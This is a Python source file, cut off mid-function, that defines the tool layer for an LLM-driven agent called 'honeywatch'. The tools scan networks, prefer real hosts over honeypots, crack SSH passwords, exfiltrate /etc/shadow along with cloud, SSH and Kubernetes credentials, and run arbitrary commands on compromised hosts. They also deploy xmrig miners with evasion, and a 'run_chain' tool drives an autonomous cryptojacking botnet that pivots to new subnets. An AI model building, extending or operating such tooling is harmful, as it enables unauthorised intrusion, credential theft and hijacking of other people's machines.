"""Callable tools exposed to the honeywatch chat agent.

Each tool is a function that accepts a dict of arguments and returns a dict
result. The agent parses tool calls from the LLM, executes them, and feeds the
results back into the conversation. Tools are intentionally coarse-grained so
a single command like "scan 10.0.0.0/24 and deploy xmrig on real hosts" can be
broken into scan + deploy + report.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from typing import Any, Callable

from honeywatch.agent.setup import AgentConfig, SetupStore
from honeywatch.c2.store import C2Store
from honeywatch.config import load_config
from honeywatch.models import Fingerprint, HostHit, Score, Target
from honeywatch.ops import (
    TargetFilter,
    build_manifest,
    enqueue_operation,
    prepare_evasion_pipeline,
    select_targets,
)
from honeywatch.payloads import get_payload, list_payloads
from honeywatch.pipeline import Pipeline
from honeywatch.store import Store

ToolFunc = Callable[[dict[str, Any], "ToolContext"], dict[str, Any]]


class ToolContext:
    """Shared runtime context passed to every tool execution."""

    def __init__(
        self,
        db_path: str = "honeywatch.db",
        agent_config: AgentConfig | None = None,
        skip_vpn_check: bool = False,
        on_config_change: Callable[[], None] | None = None,
    ):
        self.db_path = db_path
        self.agent_config = agent_config or AgentConfig()
        self.skip_vpn_check = skip_vpn_check
        # Invoked after a tool mutates agent_config in place (e.g. set_ollama),
        # so the owning agent can rebuild its live OllamaClient. Without this,
        # a config change only takes effect on the next process restart.
        self.on_config_change = on_config_change
        self._store: Store | None = None
        self._c2_store: C2Store | None = None
        self._hypothesis_store: Any | None = None
        self._audit_store: Any | None = None
        # Set by the agent loop so hypothesis/audit tools can tag records with
        # the current run_id + cycle.  Defaults to "interactive" / 0 for the
        # chat path where no autonomous run is in flight.
        self.run_id: str = "interactive"
        self.cycle: int = 0
        self._opsec_manager: Any = None

    @property
    def store(self) -> Store:
        if self._store is None:
            self._store = Store(self.db_path)
        return self._store

    @property
    def c2_store(self) -> C2Store:
        if self._c2_store is None:
            self._c2_store = C2Store(self.db_path)
        return self._c2_store

    @property
    def hypothesis_store(self):
        if self._hypothesis_store is None:
            from honeywatch.agent.hypothesis import HypothesisStore
            self._hypothesis_store = HypothesisStore(self.db_path)
        return self._hypothesis_store

    @property
    def audit_store(self):
        if self._audit_store is None:
            from honeywatch.audit import AuditStore
            self._audit_store = AuditStore(self.db_path)
        return self._audit_store

    @property
    def opsec_manager(self):
        """Lazy-built OpsecManager from the config. Phase 7: pacing + noise scoring."""
        if self._opsec_manager is None:
            try:
                from honeywatch.opsec import OpsecProfile, OpsecManager
                from honeywatch.config import load_config
                cfg = load_config()
                profile = OpsecProfile.from_config(cfg)
                self._opsec_manager = OpsecManager(profile)
            except Exception:
                self._opsec_manager = None
        return self._opsec_manager


def _require_vpn(ctx: ToolContext) -> bool:
    """Return True when a network tool may proceed."""
    from honeywatch.vpn import DEFAULT_TIMEOUT, require_mullvad

    if ctx.skip_vpn_check:
        return True
    cfg = load_config()
    vpn_cfg = getattr(cfg, "vpn", None)
    required = bool(getattr(vpn_cfg, "required", True)) if vpn_cfg else True
    if not required:
        return True
    timeout = getattr(vpn_cfg, "timeout_s", DEFAULT_TIMEOUT) if vpn_cfg else DEFAULT_TIMEOUT
    # require_mullvad always returns a plain bool (quiet only mutes logging).
    if require_mullvad(timeout=timeout, quiet=True):
        return True
    print(
        "honeywatch: REFUSED - Mullvad VPN is not connected. "
        "Pass skip_vpn_check=true or connect Mullvad.",
        file=sys.stderr,
    )
    return False


_TOOL_SPECS: list[dict[str, Any]] = [
    {
        "name": "list_payloads",
        "description": "List available red-team payload IDs and categories.",
        "parameters": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Optional category filter: miner, exploit, or evasion.",
                }
            },
        },
    },
    {
        "name": "get_status",
        "description": "Return the current database status: total hosts and label counts.",
        "parameters": {"type": "object", "properties": {}},
    },
    {
        "name": "scan",
        "description": "Run a masscan/zmap discovery + SSH probe over a target range.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {
                    "type": "string",
                    "description": "Comma-separated IPs/CIDRs to scan, e.g. 10.0.0.0/24.",
                },
                "tool": {
                    "type": "string",
                    "description": "Scanner tool: masscan or zmap. Default masscan.",
                },
                "ports": {
                    "type": "string",
                    "description": "Ports to scan, default 22.",
                },
                "rate": {
                    "type": "integer",
                    "description": "Packets per second. Default 1000.",
                },
                "max_hosts": {
                    "type": "integer",
                    "description": "Cap how many hosts are probed and scored.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full (full needs paramiko).",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate for controlled testing.",
                },
            },
            "required": ["targets"],
        },
    },
    {
        "name": "probe_host",
        "description": "Fingerprint and classify a single SSH host.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {
                    "type": "string",
                    "description": "ip[:port] to probe.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full.",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate.",
                },
            },
            "required": ["host"],
        },
    },
    {
        "name": "deploy",
        "description": "Build and enqueue a payload deployment against selected targets.",
        "parameters": {
            "type": "object",
            "properties": {
                "payload_id": {
                    "type": "string",
                    "description": "Payload to deploy, e.g. xmrig, xmrigcc, stratum, metasploit.",
                },
                "target_label": {
                    "type": "string",
                    "description": "Filter targets by final label: real, likely_real, uncertain, likely_honeypot, honeypot.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum final confidence. Default 0.7.",
                },
                "max_confidence": {
                    "type": "number",
                    "description": "Maximum final confidence. Default 1.0.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max number of targets.",
                },
                "target_file": {
                    "type": "string",
                    "description": "Path to file with ip[:port] lines; if omitted, use store.",
                },
                "evasion": {
                    "type": "string",
                    "description": "Comma-separated evasion payload ids, e.g. upx,symbol_strip.",
                },
                "exec_mode": {
                    "type": "string",
                    "description": "dry_run, local_simulate, or ssh.",
                },
                "ssh_user": {
                    "type": "string",
                    "description": "SSH user for ssh mode.",
                },
                "ssh_key": {
                    "type": "string",
                    "description": "SSH private key path.",
                },
                "variables": {
                    "type": "object",
                    "description": "Extra payload variables. For miner payloads, wallet/pool/worker/pass/tls are auto-filled from setup unless overridden here.",
                },
            },
            "required": ["payload_id"],
        },
    },
    {
        "name": "report",
        "description": "Generate a JSON/CSV/Markdown report from the store.",
        "parameters": {
            "type": "object",
            "properties": {
                "format": {
                    "type": "string",
                    "description": "json, csv, or md. Default json.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Number of rows. Default 20.",
                },
                "label": {
                    "type": "string",
                    "description": "Filter by final label.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum confidence. Default 0.0.",
                },
            },
        },
    },
    {
        "name": "get_operations",
        "description": "List C2 operations and their statuses.",
        "parameters": {
            "type": "object",
            "properties": {
                "status": {
                    "type": "string",
                    "description": "Filter by status: pending, running, completed, failed.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max operations to return.",
                },
            },
        },
    },
    {
        "name": "get_tasks",
        "description": "List C2 tasks, optionally filtered by operation or status.",
        "parameters": {
            "type": "object",
            "properties": {
                "operation_id": {
                    "type": "string",
                    "description": "Filter by operation id.",
                },
                "status": {
                    "type": "string",
                    "description": "Filter by status.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max tasks to return.",
                },
            },
        },
    },
    {
        "name": "set_wallet",
        "description": "Update the default mining wallet/pool configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "pool": {"type": "string"},
                "wallet": {"type": "string"},
                "pass": {"type": "string"},
                "worker": {"type": "string"},
                "tls": {"type": "boolean"},
            },
        },
    },
    {
        "name": "set_ollama",
        "description": "Update the Ollama API configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "api_key": {"type": "string"},
                "base_url": {"type": "string"},
                "model": {"type": "string"},
            },
        },
    },
    {
        "name": "crack_ssh",
        "description": "Online SSH password cracking against one or more hosts. Persists recovered credentials to the store for later deploy runs.",
        "parameters": {
            "type": "object",
            "properties": {
                "hosts": {
                    "type": "string",
                    "description": "Comma-separated ip[:port] hosts to crack, e.g. 10.0.0.5,10.0.0.6:2222.",
                },
                "target_label": {
                    "type": "string",
                    "description": "Pull hosts from the store by final label instead of passing hosts.",
                },
                "min_confidence": {"type": "number"},
                "limit": {"type": "integer"},
                "users": {
                    "type": "string",
                    "description": "Comma-separated usernames to try (default: built-in population).",
                },
                "user": {"type": "string"},
                "wordlist": {"type": "string", "description": "path to a wordlist file (defaults to bundled wordlist)."},
                "passwords": {"type": "string"},
                "no_mutations": {"type": "boolean"},
                "concurrency": {"type": "integer"},
                "max_attempts": {"type": "integer"},
                "spray_order": {"type": "boolean", "description": "Iterate one password across all users before the next password (lockout-safe). Default: false (grid order)."},
                "timeout": {"type": "number"},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["hosts"],
        },
    },
    {
        "name": "list_credentials",
        "description": "List cracked SSH credentials stored by crack_ssh.",
        "parameters": {
            "type": "object",
            "properties": {
                "ip": {"type": "string"},
                "user": {"type": "string"},
                "limit": {"type": "integer"},
            },
        },
    },
    {
        "name": "grab_shadow",
        "description": "SFTP-exfil /etc/shadow from a popped host using cracked creds (auto-fills from the store).",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "ip[:port] to exfil from."},
                "user": {"type": "string"},
                "pass": {"type": "string"},
                "key": {"type": "string"},
                "stash": {"type": "string"},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "grab_loot",
        "description": "Full credential + intel exfil from a popped host. Steals cloud creds (AWS/GCP/Azure IMDS), "
                       "SSH private keys, k8s tokens, docker config, shell history, and known_hosts. Cloud creds can "
                       "spawn fresh infrastructure to mine on; SSH keys + known_hosts widen lateral pivoting.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "ip[:port] of the foothold to loot."},
                "user": {"type": "string"},
                "pass": {"type": "string"},
                "key": {"type": "string"},
                "stash": {"type": "string", "description": "local stash dir (default .honeywatch/loot_stash)."},
                "encrypt": {"type": "boolean", "description": "encrypt exfiltrated files at rest with vault_passphrase (default false)."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "hashcrack",
        "description": "Offline-crack an /etc/shadow file with hashcat or john, persisting recovered passwords to the store.",
        "parameters": {
            "type": "object",
            "properties": {
                "shadow": {"type": "string", "description": "path to /etc/shadow or a stash dir from grab_shadow."},
                "wordlist": {"type": "string", "description": "path to wordlist file (defaults to bundled wordlist)."},
                "tool": {"type": "string", "description": "hashcat or john (default hashcat)."},
                "mode": {"type": "integer"},
                "ip": {"type": "string", "description": "record creds against this host in the store."},
                "port": {"type": "integer"},
                "no_save": {"type": "boolean"},
            },
            "required": ["shadow"],
        },
    },
    {
        "name": "run_chain",
        "description": "Run the autonomous cryptojacker chain: scan -> spray -> foothold -> hashcrack -> deploy xmrig -> pivot, looping on growth. Give it targets and it drives the whole botnet; pool/wallet default from `honeywatch setup`.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {"type": "string", "description": "comma-separated CIDRs/IPs for recon, e.g. 10.0.0.0/24"},
                "users": {"type": "string"},
                "passwords": {"type": "string"},
                "payload": {"type": "string", "description": "default xmrig"},
                "pool": {"type": "string", "description": "mining pool URL; defaults to the pool configured in `honeywatch setup`."},
                "wallet": {"type": "string", "description": "Monero wallet address; defaults to the wallet configured in `honeywatch setup`."},
                "hashcrack_wordlist": {"type": "string"},
                "business_hours": {"type": "boolean"},
                "max_rounds": {"type": "integer"},
                "skip_vpn_check": {"type": "boolean"},
            },
        },
    },
    {
        "name": "propose_hypothesis",
        "description": "Declare a hypothesis you are testing so the outcome judge can track whether the evidence confirms or refutes it. Call this before running a tool whose result should prove a specific claim (e.g. 'this host has weak SSH credentials', 'this subnet has honeypots').",
        "parameters": {
            "type": "object",
            "properties": {
                "statement": {"type": "string", "description": "The claim you are testing, e.g. '10.0.0.5 has weak SSH credentials'."},
                "target": {"type": "string", "description": "Optional target IP/host the hypothesis concerns."},
                "expected_evidence": {"type": "string", "description": "What evidence would confirm this, e.g. 'valid credentials returned'."},
            },
            "required": ["statement"],
        },
    },
    {
        "name": "list_hypotheses",
        "description": "Query the hypothesis ledger. Returns open, confirmed, refuted, or all hypotheses for the current run.",
        "parameters": {
            "type": "object",
            "properties": {
                "status": {"type": "string", "description": "Filter by status: open, confirmed, refuted, inconclusive, exhausted. omit for all."},
                "limit": {"type": "integer", "description": "max results (default 50)"},
            },
        },
    },
    {
        "name": "score_outcome",
        "description": "Provide evidence for the outcome judge to evaluate against a hypothesis. The judge determines whether the evidence confirms, refutes, or is inconclusive for the claim. This is how you close a hypothesis after a tool returns results.",
        "parameters": {
            "type": "object",
            "properties": {
                "hypothesis_id": {"type": "string", "description": "The hypothesis id returned by propose_hypothesis."},
                "evidence": {"type": "string", "description": "JSON string of the evidence (typically the tool result dict)."},
                "tool": {"type": "string", "description": "Name of the tool that produced the evidence (e.g. crack_ssh, grab_shadow). Used to track independent verification — a check from a different tool than the previous one counts as independent."},
            },
            "required": ["hypothesis_id", "evidence"],
        },
    },
    {
        "name": "verify_audit",
        "description": "Verify the tamper-evident audit chain. Returns whether the chain is intact or where tampering was detected. Pass a run_id to verify only that run's records.",
        "parameters": {
            "type": "object",
            "properties": {
                "run_id": {"type": "string", "description": "Optional: verify only this run's records."},
            },
        },
    },
    {
        "name": "get_evidence",
        "description": "Read recent audit-chain records for a target. Returns the last N tool calls, deploys, cracks, and grabs recorded against the target, with their SHA256 chain links.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP/host to fetch evidence for."},
                "limit": {"type": "integer", "description": "max results (default 25)"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "query_capabilities",
        "description": "List available capability graph nodes — the requires/produces contracts that drive the autonomous chain. Returns which capabilities are ready, blocked, or done given the current fleet state. Use this to understand what the chain can do next and why a phase might be blocked.",
        "parameters": {
            "type": "object",
            "properties": {
                "phase": {"type": "string", "description": "Optional: filter by phase (recon, enumerate, spray, foothold, escalate, loot, persist, pivot)."},
            },
        },
    },
    {
        "name": "get_capability_details",
        "description": "Get full details on one capability: its requires, produces, cost, tool name, and current applicability (ready/blocked/done). Use this to understand why a capability is blocked and what it needs.",
        "parameters": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "Capability id, e.g. recon, spray, foothold, pivot."},
            },
            "required": ["name"],
        },
    },
    {
        "name": "exec_command",
        "description": "Run an arbitrary command on a foothold via SSH. Use this for post-exploitation: enumerate services, read configs, plant files, check processes, run privesc checks — anything between the fixed phase boundaries. Requires a stored or provided credential.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target IP."},
                "port": {"type": "integer", "description": "SSH port (default 22)."},
                "user": {"type": "string", "description": "SSH username. Defaults to the stored credential's user."},
                "password": {"type": "string", "description": "SSH password. Defaults to the stored credential's password."},
                "command": {"type": "string", "description": "Shell command to execute on the target."},
                "timeout": {"type": "number", "description": "Timeout in seconds (default 15)."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host", "command"],
        },
    },
    {
        "name": "port_scan",
        "description": "Quick stdlib TCP connect port scanner. No external deps — works on Windows where masscan/zmap don't exist. Bounded concurrency (default 256). Use for single-host port discovery before a full probe.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {"type": "string", "description": "Comma-separated IPs or CIDRs, e.g. 10.0.0.5 or 10.0.0.0/24."},
                "ports": {"type": "string", "description": "Comma-separated ports or ranges, e.g. 22,80,443 or 1-1000 (default: 22,80,443,8080)."},
                "timeout": {"type": "number", "description": "Per-port timeout in seconds (default 2)."},
                "concurrency": {"type": "integer", "description": "Max concurrent connections (default 256)."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["targets"],
        },
    },
    {
        "name": "web_probe",
        "description": "HTTP probe via stdlib urllib. Grabs status code, headers, and optionally checks common paths (/admin, /.env, /wp-login.php, etc.). Use to detect web services and find web-based initial access vectors.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL, e.g. http://10.0.0.5:8080/."},
                "paths": {"type": "string", "description": "Comma-separated paths to check (default: /admin, /.env, /wp-login.php, /robots.txt, /.git/HEAD)."},
                "timeout": {"type": "number", "description": "Request timeout in seconds (default 5)."},
            },
            "required": ["url"],
        },
    },
    {
        "name": "credential_for",
        "description": "Query stored credentials for a specific host. Returns all recovered credentials (user, password, source) for the given IP+port.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target IP."},
                "port": {"type": "integer", "description": "SSH port (optional, default all ports)."},
            },
            "required": ["host"],
        },
    },
    {
        "name": "test_credential",
        "description": "Verify a credential works by attempting a quick SSH auth check. Use before deploying to avoid wasting a deploy task on a rotated credential. Defaults to the stored credential for the host if no password is provided.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target IP."},
                "port": {"type": "integer", "description": "SSH port (default 22)."},
                "user": {"type": "string", "description": "SSH username (defaults to stored)."},
                "password": {"type": "string", "description": "SSH password (defaults to stored)."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "botnet_status",
        "description": "Query the current chain state: round, hosts discovered, sprayable hosts, credentials recovered, footholds, enqueued deploys, pivoted subnets, loot count, cloud creds. Use to understand what the chain has accomplished so far.",
        "parameters": {
            "type": "object",
            "properties": {},
        },
    },
    {
        "name": "metasploit",
        "description": "Run a Metasploit module against a target with a recovered credential. Generates a resource script, runs msfconsole -q -r, and captures output. Unlocks SSH post-exploitation modules (session enumeration, hashdump, route/pivoting, port forwarding). Requires msfconsole on PATH.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target IP."},
                "port": {"type": "integer", "description": "SSH port (default 22)."},
                "user": {"type": "string", "description": "SSH username (defaults to stored)."},
                "password": {"type": "string", "description": "SSH password (defaults to stored)."},
                "module": {"type": "string", "description": "Metasploit module path (default: auxiliary/scanner/ssh/ssh_version)."},
                "options": {"type": "string", "description": "JSON dict of additional msf set options, e.g. {\"RHOSTS\":\"10.0.0.5\",\"VERBOSE\":\"true\"}."},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default 60)."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "verify_deploy",
        "description": "Verify that a deployed miner is actually running on a foothold. SSHes into the host and checks for the xmrig process. Returns running/not_running status per host.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "ip[:port] of the foothold to verify."},
                "user": {"type": "string", "description": "SSH username (defaults to stored credential)."},
                "pass": {"type": "string", "description": "SSH password (defaults to stored credential)."},
                "key": {"type": "string", "description": "SSH private key path."},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "retry_task",
        "description": "Re-queue a failed C2 task for retry. Resets the task status from 'failed' to 'pending' so another worker can claim it. Only works if retry_count < max_retries (default 3).",
        "parameters": {
            "type": "object",
            "properties": {
                "task_id": {"type": "string", "description": "ID of the failed task to retry."},
            },
            "required": ["task_id"],
        },
    },
    {
        "name": "ca_rotate",
        "description": "Check or trigger CA certificate rotation on the C2 controller. When active, workers can fetch the new CA from /api/ca-rotate and add it to their trust store.",
        "parameters": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "description": "check or trigger. 'check' returns current rotation status; 'trigger' generates a new CA cross-signed by the old one.", "enum": ["check", "trigger"]},
                "transition_hours": {"type": "integer", "description": "Hours for the rotation transition window (default 24). Only used with action=trigger."},
            },
            "required": ["action"],
        },
    },
]


def _tool(name: str, func: ToolFunc) -> None:
    spec = next((s for s in _TOOL_SPECS if s["name"] == name), None)
    if spec is None:
        raise ValueError(f"missing tool spec for {name!r}")
    TOOL_REGISTRY[name] = {"func": func, "spec": spec}


TOOL_REGISTRY: dict[str, dict[str, Any]] = {}


# --------------------------------------------------------------------------- #
# Tool implementations
# --------------------------------------------------------------------------- #


def _tool_list_payloads(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    category = args.get("category")
    payloads = list_payloads(category)
    return {
        "payloads": [
            {
                "id": p.id,
                "category": p.category,
                "name": p.name,
                "description": p.description,
                "install_type": p.install_type,
                "tags": p.tags,
            }
            for p in payloads
        ]
    }


def _tool_get_status(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    stats = ctx.store.stats()
    return {"status": stats}


def _tool_scan(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the scan. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_ports

    cfg = load_config()
    store = ctx.store
    targets = [t.strip() for t in args["targets"].split(",") if t.strip()]
    tool = args.get("tool", "masscan")
    ports = parse_ports(args.get("ports", "22"))
    rate = int(args.get("rate", 1000))
    max_hosts = args.get("max_hosts")
    probe_level = args.get("probe_level", "fast")

    # Update config with CLI-equivalent overrides for the pipeline.
    _set(cfg.probe, "level", probe_level)

    async def _run():
        pipeline = Pipeline(cfg, store=store)
        return await pipeline.scan(
            targets=targets,
            tool=tool,
            ports=ports,
            rate=rate,
            max_hosts=max_hosts,
            skip_vpn_check=True,  # already checked above
        )

    scores = asyncio.run(_run())
    return {
        "scanned": len(scores),
        "summary": _summarize_scores(scores),
        "top": [_score_summary(s) for s in sorted(scores, key=lambda x: x.final_confidence, reverse=True)[:10]],
    }


def _tool_probe_host(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the probe. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host

    cfg = load_config()
    ip, port = parse_host(args["host"])
    level = args.get("probe_level", getattr(cfg.probe, "level", "fast"))
    _set(cfg.probe, "level", level)

    async def _run():
        pipeline = Pipeline(cfg)
        fps = await pipeline.probe_hosts([HostHit(ip=ip, port=port)])
        if not fps:
            return []
        return await pipeline.analyze_and_score(fps)

    scores = asyncio.run(_run())
    if not scores:
        return {"error": "no fingerprint captured"}
    return {"result": _score_summary(scores[0])}


def _tool_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    payload_id = args["payload_id"]
    variables = dict(args.get("variables", {}))

    # Auto-fill miner variables from agent setup unless overridden.
    if payload_id in {"xmrig", "xmrigcc"}:
        cfg = ctx.agent_config
        if cfg.pool and "pool" not in variables:
            variables["pool"] = cfg.pool
        if cfg.wallet and "wallet" not in variables:
            variables["wallet"] = cfg.wallet
        if cfg.pass_ and "pass" not in variables:
            variables["pass"] = cfg.pass_
        if cfg.worker and "worker" not in variables:
            variables["worker"] = cfg.worker
        if "tls" not in variables:
            variables["tls"] = str(cfg.tls).lower()

    missing = []
    if payload_id == "xmrig":
        if not variables.get("pool"):
            missing.append("pool")
        if not variables.get("wallet"):
            missing.append("wallet")
    elif payload_id == "xmrigcc":
        # xmrigcc also requires a C&C server address (cc_server).
        for k in ("pool", "wallet", "cc_server"):
            if not variables.get(k):
                missing.append(k)
    if missing:
        return {
            "error": f"payload {payload_id!r} missing required variables: {', '.join(missing)}. Run set_wallet or provide them in variables.",
        }

    targets: list[Target] = []
    target_file = args.get("target_file")
    if target_file:
        from honeywatch.cli import parse_host

        try:
            with open(target_file, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    ip, port = parse_host(line)
                    targets.append(
                        Target(
                            ip=ip,
                            port=port,
                            allowed_categories=[],
                            ssh_user=args.get("ssh_user", ctx.agent_config.ssh_user),
                            ssh_key=args.get("ssh_key"),
                        )
                    )
        except OSError as exc:
            return {"error": f"cannot read target_file {target_file!r}: {exc}"}
    else:
        label = args.get("target_label")
        labels = {label} if label else {"real", "likely_real"}
        filter_ = TargetFilter(
            labels=labels,
            min_confidence=args.get("min_confidence", 0.7),
            max_confidence=args.get("max_confidence", 1.0),
            limit=args.get("limit"),
        )
        targets = select_targets(
            ctx.store,
            filter_,
            args.get("ssh_user", ctx.agent_config.ssh_user),
            args.get("ssh_key"),
        )

    if not targets:
        return {"error": "no targets matched"}

    # Auto-fill cracked credentials from the store so a chat-driven "crack
    # then deploy" loop needs no extra args. Explicit user/key still win.
    if not args.get("ssh_user") and not args.get("ssh_key"):
        for target in targets:
            if target.ssh_user and target.ssh_pass:
                continue
            cred = ctx.store.credential_for(target.ip, target.port)
            if not cred:
                continue
            if not target.ssh_user:
                target.ssh_user = cred.get("user")
            if not target.ssh_pass:
                target.ssh_pass = cred.get("password")

    evasion = prepare_evasion_pipeline(args.get("evasion"))
    manifest = build_manifest(payload_id, targets, variables, evasion)
    op = enqueue_operation(ctx.c2_store, manifest)
    return {
        "operation_id": op.id,
        "payload_id": payload_id,
        "targets": len(targets),
        "status": op.status,
    }


def _tool_report(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    fmt = args.get("format", "json")
    limit = int(args.get("limit", 20))
    label = args.get("label")
    min_confidence = float(args.get("min_confidence", 0.0))
    scores = ctx.store.query_scores(limit=limit, label=label, min_confidence=min_confidence)
    return {
        "format": fmt,
        "rows": len(scores),
        "data": [_score_summary(s) for s in scores],
    }


def _tool_get_operations(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    status = args.get("status")
    limit = int(args.get("limit", 50))
    ops = ctx.c2_store.list_operations(status=status, limit=limit)
    return {
        "operations": [
            {
                "id": o.id,
                "payload_id": o.payload_id,
                "status": o.status,
                "targets": len(o.target_ips),
                "created_at": o.created_at,
                "updated_at": o.updated_at,
            }
            for o in ops
        ]
    }


def _tool_get_tasks(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    operation_id = args.get("operation_id")
    status = args.get("status")
    limit = int(args.get("limit", 100))
    tasks = ctx.c2_store.list_tasks(
        operation_id=operation_id, status=status, limit=limit
    )
    return {
        "tasks": [
            {
                "id": t.id,
                "operation_id": t.operation_id,
                "payload_id": t.payload_id,
                "category": t.category,
                "target": f"{t.target.ip}:{t.target.port}" if t.target else None,
                "status": t.status,
                "worker_id": t.worker_id,
            }
            for t in tasks
        ]
    }


def _tool_set_wallet(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "pool" in args:
        cfg.pool = args["pool"]
    if "wallet" in args:
        cfg.wallet = args["wallet"]
    if "pass" in args:
        cfg.pass_ = args["pass"]
    if "worker" in args:
        cfg.worker = args["worker"]
    if "tls" in args:
        cfg.tls = bool(args["tls"])
    SetupStore(ctx.db_path).save_config(cfg)
    return {"ok": True, "wallet": cfg.wallet, "pool": cfg.pool, "worker": cfg.worker}


def _tool_set_ollama(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "api_key" in args:
        cfg.ollama_api_key = args["api_key"]
    if "base_url" in args:
        cfg.ollama_base_url = args["base_url"]
    if "model" in args:
        cfg.ollama_model = args["model"]
    SetupStore(ctx.db_path).save_config(cfg)
    # Rebuild the owning agent's live client so the new endpoint/model/key
    # take effect immediately instead of requiring a restart.
    if ctx.on_config_change is not None:
        try:
            ctx.on_config_change()
        except Exception:
            pass
    return {
        "ok": True,
        "base_url": cfg.ollama_base_url,
        "model": cfg.ollama_model,
    }


def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the crack run. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.crack import CrackTarget, crack_targets, load_wordlist

    cfg = load_config()
    crack_cfg = getattr(cfg, "crack", None)
    concurrency = int(args.get("concurrency") or getattr(crack_cfg, "concurrency", 8))
    host_concurrency = int(args.get("host_concurrency") or getattr(crack_cfg, "host_concurrency", 32))
    timeout_s = float(args.get("timeout") or getattr(crack_cfg, "timeout_s", 6.0))
    max_attempts = args.get("max_attempts")
    if max_attempts is not None:
        max_attempts = int(max_attempts)
    else:
        max_attempts = getattr(crack_cfg, "max_attempts", None)
    mutations = (not bool(args.get("no_mutations", False))) and bool(getattr(crack_cfg, "mutations", True))

    users: list[str] = []
    if args.get("user"):
        users = [args["user"]]
    elif args.get("users"):
        users = [u.strip() for u in args["users"].split(",") if u.strip()]

    passwords: list[str] = []
    if args.get("passwords"):
        passwords = [p.strip() for p in args["passwords"].split(",") if p.strip()]

    wordlist: list[str] | None = None
    if args.get("wordlist"):
        wordlist = load_wordlist(args["wordlist"])
    else:
        # Default to the bundled wordlist so crack_ssh works out of the box.
        from honeywatch.crack import default_wordlist_path
        wordlist = load_wordlist(default_wordlist_path())

    hosts: list[tuple[str, int]] = []
    raw = args.get("hosts") or ""
    for spec in raw.split(","):
        spec = spec.strip()
        if spec:
            ip, port = parse_host(spec)
            hosts.append((ip, port))

    if not hosts and (args.get("target_label") or args.get("min_confidence") is not None):
        rows = ctx.store.query(
            limit=int(args.get("limit") or 1000),
            label=args.get("target_label"),
            min_confidence=float(args.get("min_confidence") or 0.0),
        )
        for row in rows:
            hosts.append((row["ip"], int(row["port"])))

    if not hosts:
        return {"error": "no targets. Pass hosts=... or target_label/min_confidence."}

    targets = [
        CrackTarget(
            ip=ip, port=port, users=users, passwords=passwords,
            wordlist=wordlist, mutations=mutations,
            max_attempts=max_attempts, timeout_s=timeout_s,
            spray_order=bool(args.get("spray_order", False)),
        )
        for ip, port in hosts
    ]

